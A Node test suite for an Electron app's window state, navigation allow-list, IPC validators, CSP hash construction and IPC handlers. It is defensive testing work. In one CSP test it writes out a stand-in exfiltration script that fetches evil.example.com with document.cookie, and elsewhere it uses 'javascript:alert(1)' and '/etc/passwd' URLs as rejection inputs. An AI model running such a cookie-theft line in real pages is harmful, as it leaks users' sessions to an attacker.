import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { EventEmitter } from "node:events";
import { registerHooks } from "node:module";

import {
  DEFAULT_STATE,
  sanitizeState,
  readState,
  writeState,
  createWindowState,
} from "../electron/window-state.js";

import {
  DEV_SERVER_URL,
  resolveAppEntry,
  isAllowedNavigationTarget,
  isExternalHttpUrl,
} from "../electron/resolve-path.js";

import {
  ValidationError,
  validateStoreWrite,
  validateEndpointInput,
  validateEndpointUpdate,
  validateEndpointId,
  toEndpointView,
  validateAiCallInput,
  validateAiCancel,
  validateOpenDialogOptions,
  validateSaveDialogOptions,
} from "../electron/ipc/validators.js";

// electron/main.js and electron/ipc/handlers.js `import ... from "electron"` at
// module scope, and `electron` is not installed in a headless node --test run.
// registerHooks() (node:module, synchronous + in-process) swaps that ONE
// specifier for the stub below so their pure logic — CSP header construction and
// the IPC handler contract — is exercisable under plain `node --test`, with no
// CLI flags and no GUI. Every other specifier resolves normally.
//
// This does NOT boot a BrowserWindow: `app.whenReady()` returns a promise that
// never settles, so main.js's `app.whenReady().then(...)` bootstrap (window,
// menu, real CSP install) stays inert and importing main.js only yields its
// exports. Anything that needs a real Chromium — whether the CSP header is
// actually applied to a file:// load, whether the page truly hydrates — cannot
// be checked here; see "Verifying" in electron/README.md.
const ELECTRON_STUB = `
  export const app = {
    isPackaged: false,
    // main.js pins the app name before anything resolves userData — a file-path
    // launch otherwise puts the key store in the shared ~/.config/Electron.
    // The stub models the real API; without setName, importing main.js throws.
    setName() {},
    getName: () => "coop-prep",
    getVersion: () => "0.1.0",
    getPath: (name) => "/tmp/coop-test-userdata/" + name,
    requestSingleInstanceLock: () => true,
    whenReady: () => new Promise(() => {}),
    on() {},
    quit() {},
  };
  export const dialog = {};
  export const ipcMain = { handle() {} };
  export const shell = {};
  export const session = { defaultSession: { webRequest: { onHeadersReceived() {} } } };
  export const Menu = { setApplicationMenu() {}, buildFromTemplate: (t) => t };
  export class BrowserWindow {
    static getAllWindows() {
      return [];
    }
  }
`;

registerHooks({
  resolve(specifier, context, nextResolve) {
    if (specifier === "electron") return { url: "stub:electron", shortCircuit: true };
    return nextResolve(specifier, context);
  },
  load(url, context, nextLoad) {
    if (url === "stub:electron") return { format: "module", source: ELECTRON_STUB, shortCircuit: true };
    return nextLoad(url, context);
  },
});

const { buildCsp, inlineScriptHashes, exportScriptHashes, isAppOriginUrl } = await import(
  "../electron/main.js"
);
const { createHandlers } = await import("../electron/ipc/handlers.js");

function tmpFile(name) {
  return path.join(fs.mkdtempSync(path.join(os.tmpdir(), "coop-electron-test-")), name);
}

function tmpDir() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "coop-electron-test-"));
}

/** The CSP source-expression for an inline script's exact text, per the CSP spec's hash rule. */
function sha256Source(scriptText) {
  return `'sha256-${crypto.createHash("sha256").update(scriptText, "utf8").digest("base64")}'`;
}

/**
 * Chromium runs an inline <script> only if script-src carries 'unsafe-inline', a
 * matching nonce, or a matching hash. Model that rule so a policy string can be
 * asserted against real script bodies without a browser.
 */
function inlineScriptRuns(csp, scriptText) {
  const scriptSrc = csp.split("; ").find((d) => d.startsWith("script-src ")) ?? "";
  if (scriptSrc.includes("'unsafe-inline'")) return true;
  return scriptSrc.split(" ").includes(sha256Source(scriptText));
}

// ---------- window-state.js ----------

test("sanitizeState: falls back to defaults for garbage input", () => {
  assert.deepEqual(sanitizeState(null), DEFAULT_STATE);
  assert.deepEqual(sanitizeState(undefined), DEFAULT_STATE);
  assert.deepEqual(sanitizeState("nope"), DEFAULT_STATE);
  assert.deepEqual(sanitizeState({ width: -5, height: "x" }), DEFAULT_STATE);
});

test("sanitizeState: rounds and preserves valid numeric bounds", () => {
  const r = sanitizeState({ width: 900.6, height: 700.2, x: 10.9, y: 20.1, isMaximized: true });
  assert.equal(r.width, 901);
  assert.equal(r.height, 700);
  assert.equal(r.x, 11);
  assert.equal(r.y, 20);
  assert.equal(r.isMaximized, true);
});

test("sanitizeState: isMaximized is only ever a strict boolean true", () => {
  assert.equal(sanitizeState({ isMaximized: "true" }).isMaximized, false);
  assert.equal(sanitizeState({ isMaximized: 1 }).isMaximized, false);
});

test("readState: missing file returns defaults, no throw", () => {
  const file = tmpFile("does-not-exist.json");
  assert.deepEqual(readState(file), DEFAULT_STATE);
});

test("readState: corrupt JSON returns defaults, no throw", () => {
  const file = tmpFile("corrupt.json");
  fs.writeFileSync(file, "{ not json");
  assert.deepEqual(readState(file), DEFAULT_STATE);
});

test("writeState + readState round-trip", () => {
  const file = tmpFile("state.json");
  const state = { width: 1000, height: 640, x: 5, y: 5, isMaximized: false };
  writeState(file, state);
  assert.deepEqual(readState(file), state);
});

test("createWindowState: save() reads bounds off the window and persists them", () => {
  const file = tmpFile("saved.json");
  const ws = createWindowState(file);
  const fakeWin = {
    getBounds: () => ({ width: 1100, height: 700, x: 12, y: 34 }),
    isMaximized: () => false,
    isDestroyed: () => false,
  };
  ws.save(fakeWin);
  assert.deepEqual(ws.state, { width: 1100, height: 700, x: 12, y: 34, isMaximized: false });
  assert.deepEqual(readState(file), ws.state);
});

test("createWindowState: save() is a no-op for a destroyed window", () => {
  const file = tmpFile("destroyed.json");
  const ws = createWindowState(file);
  const before = ws.state;
  ws.save({ isDestroyed: () => true, getBounds: () => ({ width: 1, height: 1 }) });
  assert.deepEqual(ws.state, before);
  assert.ok(!fs.existsSync(file));
});

test("createWindowState: track() saves on close (debounced resize/move don't need a timer to fire close-save)", (t, done) => {
  const file = tmpFile("tracked.json");
  const ws = createWindowState(file);
  const win = new EventEmitter();
  win.getBounds = () => ({ width: 1280, height: 800, x: 0, y: 0 });
  win.isMaximized = () => true;
  win.isDestroyed = () => false;

  ws.track(win, { debounceMs: 5 });
  win.emit("close");

  assert.deepEqual(readState(file), { width: 1280, height: 800, x: 0, y: 0, isMaximized: true });
  done();
});

// ---------- resolve-path.js ----------

test("resolveAppEntry: dev mode targets the dev server URL", () => {
  const entry = resolveAppEntry({ isDev: true, appRoot: "/wherever" });
  assert.equal(entry.type, "url");
  assert.equal(entry.target, DEV_SERVER_URL);
});

test("resolveAppEntry: prod mode targets out/index.html under appRoot as a file:// URL", () => {
  const entry = resolveAppEntry({ isDev: false, appRoot: "/opt/app/resources" });
  assert.equal(entry.type, "file");
  assert.equal(entry.target, path.join("/opt/app/resources", "out", "index.html"));
  assert.match(entry.url, /^file:\/\//);
  assert.match(entry.url, /out\/index\.html$/);
});

test("resolveAppEntry: custom exportDirName is honored", () => {
  const entry = resolveAppEntry({ isDev: false, appRoot: "/app", exportDirName: "dist-web" });
  assert.equal(entry.target, path.join("/app", "dist-web", "index.html"));
});

test("isAllowedNavigationTarget: file:// is always allowed", () => {
  assert.ok(isAllowedNavigationTarget("file:///opt/app/out/index.html"));
});

test("isAllowedNavigationTarget: same-origin as dev server is allowed", () => {
  assert.ok(isAllowedNavigationTarget("http://localhost:3000/lessons/excel", "http://localhost:3000"));
});

test("isAllowedNavigationTarget: other origins are denied", () => {
  assert.equal(isAllowedNavigationTarget("https://evil.example.com"), false);
  assert.equal(isAllowedNavigationTarget("http://localhost:9999", "http://localhost:3000"), false);
});

test("isAllowedNavigationTarget: unparseable URLs are denied, not thrown", () => {
  assert.equal(isAllowedNavigationTarget("not a url"), false);
});

test("isExternalHttpUrl: true only for http/https", () => {
  assert.ok(isExternalHttpUrl("https://example.com"));
  assert.ok(isExternalHttpUrl("http://example.com"));
  assert.equal(isExternalHttpUrl("file:///etc/passwd"), false);
  assert.equal(isExternalHttpUrl("javascript:alert(1)"), false);
  assert.equal(isExternalHttpUrl("not a url"), false);
});

// ---------- ipc/validators.js ----------

test("validateStoreWrite: requires a plain string (the serialized document)", () => {
  assert.equal(validateStoreWrite("{\"progress\":{}}"), "{\"progress\":{}}");
  assert.equal(validateStoreWrite(""), "");
  assert.throws(() => validateStoreWrite({ a: 1 }), ValidationError);
  assert.throws(() => validateStoreWrite(null), ValidationError);
  assert.throws(() => validateStoreWrite(undefined), ValidationError);
});

test("validateEndpointInput: requires label/baseUrl, rejects a bad URL", () => {
  const good = validateEndpointInput({ label: "Local Ollama", baseUrl: "http://localhost:11434" });
  assert.equal(good.label, "Local Ollama");
  assert.equal(good.apiKey, ""); // defaulted

  assert.throws(() => validateEndpointInput({ label: "x", baseUrl: "not-a-url" }), ValidationError);
  assert.throws(() => validateEndpointInput({ label: "", baseUrl: "http://x" }), ValidationError);
  assert.throws(() => validateEndpointInput({ baseUrl: "http://x" }), ValidationError);
});

test("validateEndpointInput: carries apiKey through when present, trims label/baseUrl", () => {
  const r = validateEndpointInput({
    label: "  OpenAI  ",
    baseUrl: "https://api.openai.com/v1",
    apiKey: "sk-secret",
  });
  assert.equal(r.label, "OpenAI");
  assert.equal(r.apiKey, "sk-secret");
});

test("validateEndpointUpdate: patch fields are optional (partial update)", () => {
  const r = validateEndpointUpdate({ id: "abc", patch: { apiKey: "sk-new" } });
  assert.equal(r.id, "abc");
  assert.deepEqual(r.patch, { apiKey: "sk-new" });
  assert.throws(() => validateEndpointUpdate({ id: "abc", patch: { baseUrl: "nope" } }), ValidationError);
  assert.throws(() => validateEndpointUpdate({ patch: {} }), ValidationError); // no id
});

test("validateEndpointId: requires non-empty string id", () => {
  assert.deepEqual(validateEndpointId({ id: "x" }), { id: "x" });
  assert.throws(() => validateEndpointId({}), ValidationError);
  assert.throws(() => validateEndpointId({ id: 5 }), ValidationError);
});

test("toEndpointView: never leaks apiKey, matches lib/endpoints/registry.js's toView field names", () => {
  const view = toEndpointView({
    id: "1",
    label: "OpenAI",
    providerId: "openai",
    baseUrl: "https://api.openai.com/v1",
    apiKey: "sk-super-secret",
    createdAt: "2026-07-15T00:00:00.000Z",
    updatedAt: "2026-07-15T00:00:00.000Z",
  });
  assert.equal(JSON.stringify(view).includes("sk-super-secret"), false);
  assert.deepEqual(view, {
    id: "1",
    label: "OpenAI",
    providerId: "openai",
    baseUrl: "https://api.openai.com/v1",
    hasKey: true,
    createdAt: "2026-07-15T00:00:00.000Z",
    updatedAt: "2026-07-15T00:00:00.000Z",
  });
});

test("toEndpointView: hasKey is false when apiKey is empty/missing", () => {
  assert.equal(toEndpointView({ id: "1", label: "l", baseUrl: "http://x" }).hasKey, false);
  assert.equal(toEndpointView({ id: "1", label: "l", baseUrl: "http://x", apiKey: "" }).hasKey, false);
});

test("validateAiCallInput: requires endpointId, model, requestId, and well-formed messages", () => {
  const r = validateAiCallInput({
    endpointId: "e1",
    model: "gpt-4o",
    requestId: "r1",
    messages: [{ role: "user", content: "hi" }],
  });
  assert.equal(r.endpointId, "e1");
  assert.equal(r.model, "gpt-4o");
  assert.equal(r.messages.length, 1);
  assert.deepEqual(r.options, {});

  assert.throws(() => validateAiCallInput({ endpointId: "e1", model: "m", requestId: "r1", messages: [] }), ValidationError);
  assert.throws(
    () =>
      validateAiCallInput({
        endpointId: "e1",
        model: "m",
        requestId: "r1",
        messages: [{ role: "bogus", content: "x" }],
      }),
    ValidationError
  );
  assert.throws(
    () => validateAiCallInput({ requestId: "r1", model: "m", messages: [{ role: "user", content: "x" }] }),
    ValidationError
  );
  assert.throws(
    () => validateAiCallInput({ endpointId: "e1", requestId: "r1", messages: [{ role: "user", content: "x" }] }),
    ValidationError
  ); // missing model
});

test("validateAiCallInput: strips unexpected message fields, keeps only role/content", () => {
  const r = validateAiCallInput({
    endpointId: "e1",
    model: "m",
    requestId: "r1",
    messages: [{ role: "user", content: "hi", extra: "should be dropped" }],
  });
  assert.deepEqual(r.messages, [{ role: "user", content: "hi" }]);
});

test("validateAiCancel: requires requestId", () => {
  assert.deepEqual(validateAiCancel({ requestId: "r1" }), { requestId: "r1" });
  assert.throws(() => validateAiCancel({}), ValidationError);
});

test("validateOpenDialogOptions: defaults multiple to false, validates filters shape", () => {
  assert.deepEqual(validateOpenDialogOptions(), { filters: undefined, multiple: false });
  assert.deepEqual(validateOpenDialogOptions({ multiple: true }), { filters: undefined, multiple: true });
  const r = validateOpenDialogOptions({ filters: [{ name: "CSV", extensions: ["csv"] }] });
  assert.deepEqual(r.filters, [{ name: "CSV", extensions: ["csv"] }]);
  assert.throws(() => validateOpenDialogOptions({ filters: "nope" }), ValidationError);
  assert.throws(() => validateOpenDialogOptions({ filters: [{ name: "CSV" }] }), ValidationError);
});

test("validateSaveDialogOptions: requires string content, rejects oversized payloads", () => {
  const r = validateSaveDialogOptions({ content: "a,b,c\n1,2,3", defaultPath: "export.csv" });
  assert.equal(r.content, "a,b,c\n1,2,3");
  assert.equal(r.defaultPath, "export.csv");
  assert.throws(() => validateSaveDialogOptions({}), ValidationError);
  assert.throws(() => validateSaveDialogOptions({ content: 123 }), ValidationError);
});

// ---------- main.js: CSP construction ----------
//
// REGRESSION (hydration): the app ships as a Next.js static export, whose HTML
// carries UNNONCED inline scripts — the `coop_theme` bootstrap from app/layout.js
// plus one `self.__next_f.push(...)` per RSC flight chunk. A bare
// `script-src 'self'` blocks every one of them, so React never hydrates and the
// window is inert. These are the exact script bodies `next build` emits.

const THEME_BOOTSTRAP =
  "try{var t=localStorage.getItem('coop_theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}";
const FLIGHT_BOOTSTRAP = "(self.__next_f=self.__next_f||[]).push([0])";
const FLIGHT_CHUNK = 'self.__next_f.push([1,"1:\\"$Sreact.fragment\\"\\n"])';

function exportHtml(scripts) {
  const tags = scripts.map((s) => `<script>${s}</script>`).join("");
  return `<!DOCTYPE html><html><head>${tags}</head><body><div id="__next"></div>` +
    `<script src="./_next/static/chunks/main.js" async></script></body></html>`;
}

test("inlineScriptHashes: hashes every inline script, ignores src'd ones", () => {
  const hashes = inlineScriptHashes(exportHtml([THEME_BOOTSTRAP, FLIGHT_BOOTSTRAP]));
  assert.deepEqual(hashes, [sha256Source(THEME_BOOTSTRAP), sha256Source(FLIGHT_BOOTSTRAP)]);
});

test("inlineScriptHashes: a script with a src attribute is never hashed (it is covered by 'self')", () => {
  assert.deepEqual(inlineScriptHashes('<script src="./a.js"></script>'), []);
  assert.deepEqual(inlineScriptHashes('<script async src="./a.js"></script>'), []);
});

test("exportScriptHashes: unions inline-script hashes across every .html in the export", () => {
  const dir = tmpDir();
  fs.writeFileSync(path.join(dir, "index.html"), exportHtml([THEME_BOOTSTRAP, FLIGHT_CHUNK]));
  fs.mkdirSync(path.join(dir, "404"));
  // The theme bootstrap repeats on every page — it must be deduped, not duplicated.
  fs.writeFileSync(path.join(dir, "404", "index.html"), exportHtml([THEME_BOOTSTRAP, FLIGHT_BOOTSTRAP]));

  const hashes = exportScriptHashes(dir);
  assert.equal(hashes.length, 3);
  for (const body of [THEME_BOOTSTRAP, FLIGHT_BOOTSTRAP, FLIGHT_CHUNK]) {
    assert.ok(hashes.includes(sha256Source(body)), `missing hash for: ${body.slice(0, 40)}`);
  }
});

test("exportScriptHashes: a missing export dir yields [] instead of throwing", () => {
  assert.deepEqual(exportScriptHashes(path.join(tmpDir(), "nope")), []);
});

test("buildCsp (packaged): every inline script the export emits is allowed to run", () => {
  const scriptHashes = inlineScriptHashes(exportHtml([THEME_BOOTSTRAP, FLIGHT_BOOTSTRAP, FLIGHT_CHUNK]));
  const csp = buildCsp({ isDev: false, scriptHashes });
  for (const body of [THEME_BOOTSTRAP, FLIGHT_BOOTSTRAP, FLIGHT_CHUNK]) {
    assert.ok(inlineScriptRuns(csp, body), `CSP blocks hydration script: ${body.slice(0, 40)}`);
  }
});

test("buildCsp (packaged): an inline script that was NOT in the export is still blocked", () => {
  const scriptHashes = inlineScriptHashes(exportHtml([THEME_BOOTSTRAP]));
  const csp = buildCsp({ isDev: false, scriptHashes });
  assert.equal(inlineScriptRuns(csp, "fetch('https://evil.example.com?k='+document.cookie)"), false);
  // ...and a one-byte tamper with a known-good script is a different hash.
  assert.equal(inlineScriptRuns(csp, THEME_BOOTSTRAP + " "), false);
});

test("buildCsp (packaged): hydration is bought with hashes, never with 'unsafe-inline'/'unsafe-eval'", () => {
  const csp = buildCsp({ isDev: false, scriptHashes: inlineScriptHashes(exportHtml([THEME_BOOTSTRAP])) });
  const scriptSrc = csp.split("; ").find((d) => d.startsWith("script-src "));
  assert.equal(scriptSrc.includes("'unsafe-inline'"), false);
  assert.equal(scriptSrc.includes("'unsafe-eval'"), false);
});

test("buildCsp: no path admits a remote script origin — that is what protects the API keys", () => {
  for (const csp of [buildCsp({ isDev: true }), buildCsp({ isDev: false, scriptHashes: ["'sha256-x'"] })]) {
    const scriptSrc = csp.split("; ").find((d) => d.startsWith("script-src "));
    const remote = scriptSrc
      .split(" ")
      .slice(1)
      .filter((s) => !s.startsWith("'") || !s.endsWith("'"));
    assert.deepEqual(remote, [], `script-src admits a non-keyword source: ${scriptSrc}`);
    assert.ok(csp.includes("object-src 'none'"));
    assert.ok(csp.includes("base-uri 'self'"));
  }
});

test("buildCsp (dev): next dev's inline scripts + React's eval are allowed, since it never ships", () => {
  const scriptSrc = buildCsp({ isDev: true }).split("; ").find((d) => d.startsWith("script-src "));
  assert.ok(scriptSrc.includes("'unsafe-inline'"));
  assert.ok(scriptSrc.includes("'unsafe-eval'"));
});

test("isAppOriginUrl (packaged): stamps file:// only, not arbitrary remote responses", () => {
  assert.ok(isAppOriginUrl("file:///opt/app/resources/out/index.html", { isDev: false }));
  assert.equal(isAppOriginUrl("https://fonts.googleapis.com/css2?family=Inter", { isDev: false }), false);
  assert.equal(isAppOriginUrl("https://api.openai.com/v1/models", { isDev: false }), false);
  assert.equal(isAppOriginUrl("not a url", { isDev: false }), false);
});

test("isAppOriginUrl (dev): stamps the dev-server origin only", () => {
  assert.ok(isAppOriginUrl("http://localhost:3000/lessons", { isDev: true, devServerUrl: "http://localhost:3000" }));
  assert.equal(isAppOriginUrl("http://localhost:9999/x", { isDev: true, devServerUrl: "http://localhost:3000" }), false);
  assert.equal(isAppOriginUrl("https://evil.example.com", { isDev: true, devServerUrl: "http://localhost:3000" }), false);
});

// ---------- ipc/handlers.js: the endpoints:add/update result contract ----------
//
// REGRESSION: these two channels must RESOLVE to the same
// { ok: true, endpoint } | { ok: false, error } shape lib/endpoints/registry.js
// returns on the web path (electron/README.md's IPC contract table), so one UI
// error branch works on both. Throwing turns it into a rejected invoke with a
// mangled message and no error.field, making that branch unreachable.

const EVT = { sender: { isDestroyed: () => false, send() {} } };

/** A registry stub shaped like lib/endpoints/registry.js's createRegistry() return value. */
function fakeRegistry(overrides = {}) {
  return {
    list: () => [],
    add: (fields) => ({ ok: true, endpoint: { id: "e1", hasKey: fields.apiKey !== "", ...fields, apiKey: undefined } }),
    update: (id, patch) => ({ ok: true, endpoint: { id, ...patch, apiKey: undefined } }),
    remove: () => ({ ok: true }),
    test: async () => ({ ok: true }),
    models: async () => ({ ok: true, models: [] }),
    ...overrides,
  };
}

test("endpoints:add: an invalid label RESOLVES to { ok: false, error } instead of rejecting", async () => {
  const h = createHandlers({ endpoints: fakeRegistry() });
  const res = await h["endpoints:add"](EVT, { label: "", baseUrl: "https://api.openai.com/v1" });
  assert.equal(res.ok, false);
  assert.equal(res.error.type, "VALIDATION_ERROR");
  assert.equal(res.error.field, "label");
  assert.equal(typeof res.error.message, "string");
});

test("endpoints:add: an invalid baseUrl reports field 'baseUrl'", async () => {
  const h = createHandlers({ endpoints: fakeRegistry() });
  const res = await h["endpoints:add"](EVT, { label: "OpenAI", baseUrl: "not-a-url" });
  assert.equal(res.ok, false);
  assert.equal(res.error.field, "baseUrl");
});

test("endpoints:update: an invalid patch RESOLVES to { ok: false, error }", async () => {
  const h = createHandlers({ endpoints: fakeRegistry() });
  const res = await h["endpoints:update"](EVT, { id: "e1", patch: { baseUrl: "nope" } });
  assert.equal(res.ok, false);
  assert.equal(res.error.type, "VALIDATION_ERROR");
  assert.equal(res.error.field, "baseUrl");
});

test("endpoints:add: a valid input still returns { ok: true, endpoint } untouched", async () => {
  const h = createHandlers({ endpoints: fakeRegistry() });
  const res = await h["endpoints:add"](EVT, { label: "OpenAI", baseUrl: "https://api.openai.com/v1" });
  assert.equal(res.ok, true);
  assert.equal(res.endpoint.label, "OpenAI");
});

test("endpoints:add: the registry's OWN { ok: false, error } is forwarded unchanged", async () => {
  const registryError = { ok: false, error: { type: "VALIDATION_ERROR", field: "label", message: "Name is required." } };
  const h = createHandlers({ endpoints: fakeRegistry({ add: () => registryError }) });
  const res = await h["endpoints:add"](EVT, { label: "ok", baseUrl: "https://api.openai.com/v1" });
  assert.deepEqual(res, registryError);
});

test("endpoints:add: an unexpected internal error rejects WITHOUT leaking the apiKey", async () => {
  const boom = (fields) => {
    throw new Error(`disk write failed for record ${JSON.stringify(fields)}`);
  };
  const h = createHandlers({ endpoints: fakeRegistry({ add: boom }) });
  await assert.rejects(
    () => h["endpoints:add"](EVT, { label: "OpenAI", baseUrl: "https://api.openai.com/v1", apiKey: "sk-super-secret" }),
    (err) => {
      assert.equal(err.message.includes("sk-super-secret"), false, "apiKey leaked into the renderer-visible error");
      return true;
    }
  );
});

// ---------- ipc/handlers.js: hermes:* and hub:* (the new companion surface) ----

/** A sender that records every push (main -> renderer) so the ack-then-stream
 *  contract can be asserted without a real ipcMain. */
function capturingEvt() {
  const sent = [];
  return { evt: { sender: { isDestroyed: () => false, send: (ch, payload) => sent.push({ ch, payload }) } }, sent };
}

test("hermes:run: acks { started } then streams chunks and a done over hermes:stream", async () => {
  const fakeHermes = {
    async run(prompt, { onChunk }) {
      assert.equal(prompt, "hello");
      onChunk("a");
      onChunk("b");
    },
    async status() {
      return { state: "ready", command: "hermes" };
    },
  };
  const h = createHandlers({ hermes: fakeHermes });
  const { evt, sent } = capturingEvt();
  const ack = await h["hermes:run"](evt, { prompt: "hello", requestId: "r1" });
  assert.deepEqual(ack, { requestId: "r1", started: true });
  // Let the fire-and-forget run() microtasks flush.
  await new Promise((r) => setTimeout(r, 5));
  const stream = sent.filter((s) => s.ch === "hermes:stream").map((s) => s.payload);
  assert.deepEqual(stream, [
    { requestId: "r1", type: "chunk", delta: "a" },
    { requestId: "r1", type: "chunk", delta: "b" },
    { requestId: "r1", type: "done" },
  ]);
});

test("hermes:run: a runtime failure streams a plain error string (no key material path)", async () => {
  const fakeHermes = { async run() { throw new Error("spawn boom"); }, async status() { return {}; } };
  const h = createHandlers({ hermes: fakeHermes });
  const { evt, sent } = capturingEvt();
  await h["hermes:run"](evt, { prompt: "x", requestId: "r2" });
  await new Promise((r) => setTimeout(r, 5));
  const err = sent.find((s) => s.payload.type === "error");
  assert.equal(err.payload.error, "spawn boom");
});

test("hermes:run: an invalid prompt rejects (validation) before spawning", async () => {
  let ran = false;
  const h = createHandlers({ hermes: { async run() { ran = true; }, async status() { return {}; } } });
  const { evt } = capturingEvt();
  await assert.rejects(() => h["hermes:run"](evt, { prompt: "", requestId: "r" }), ValidationError);
  assert.equal(ran, false);
});

test("hermes:run: a duplicate in-flight requestId is rejected", async () => {
  const h = createHandlers({
    hermes: { run: () => new Promise(() => {}), async status() { return {}; } }, // never resolves
  });
  const { evt } = capturingEvt();
  await h["hermes:run"](evt, { prompt: "one", requestId: "dup" });
  await assert.rejects(() => h["hermes:run"](evt, { prompt: "two", requestId: "dup" }), /already in flight/);
});

test("hermes:cancel: aborts the named in-flight run's controller", async () => {
  let aborted = false;
  const h = createHandlers({
    hermes: {
      run(_p, { signal }) {
        return new Promise((resolve) => signal.addEventListener("abort", () => { aborted = true; resolve(); }));
      },
      async status() { return {}; },
    },
  });
  const { evt } = capturingEvt();
  await h["hermes:run"](evt, { prompt: "long", requestId: "c1" });
  const res = await h["hermes:cancel"](evt, { requestId: "c1" });
  assert.deepEqual(res, { ok: true });
  await new Promise((r) => setTimeout(r, 5));
  assert.equal(aborted, true);
});

test("hermes:status: forwards the runtime's status verbatim", async () => {
  const h = createHandlers({ hermes: { async run() {}, async status() { return { state: "setup-required", command: "hermes" }; } } });
  const res = await h["hermes:status"](EVT, {});
  assert.deepEqual(res, { state: "setup-required", command: "hermes" });
});

test("hermes: the default (bridge-less) dep refuses to run and reports not-installed", async () => {
  const h = createHandlers({}); // no hermes dep
  const { evt, sent } = capturingEvt();
  await h["hermes:run"](evt, { prompt: "x", requestId: "d1" });
  await new Promise((r) => setTimeout(r, 5));
  const err = sent.find((s) => s.payload.type === "error");
  assert.match(err.payload.error, /unavailable/);
  const status = await h["hermes:status"](EVT, {});
  assert.equal(status.state, "not-installed");
});

test("hub:load / hub:save: forward to the injected store", async () => {
  const items = [{ id: "1", at: "t", artifact: { kind: "note", title: "T", content: "C" } }];
  let saved = null;
  const fakeHub = {
    async load() { return { ok: true, items }; },
    async save(list) { saved = list; return { ok: true }; },
  };
  const h = createHandlers({ hub: fakeHub });
  assert.deepEqual(await h["hub:load"](EVT, {}), { ok: true, items });
  assert.deepEqual(await h["hub:save"](EVT, { items }), { ok: true });
  assert.deepEqual(saved, items);
});

test("hub:save: an invalid item shape rejects before touching the store", async () => {
  let touched = false;
  const h = createHandlers({ hub: { async load() { return { ok: true, items: [] }; }, async save() { touched = true; return { ok: true }; } } });
  await assert.rejects(() => h["hub:save"](EVT, { items: [{ id: 1 }] }), ValidationError);
  assert.equal(touched, false);
});
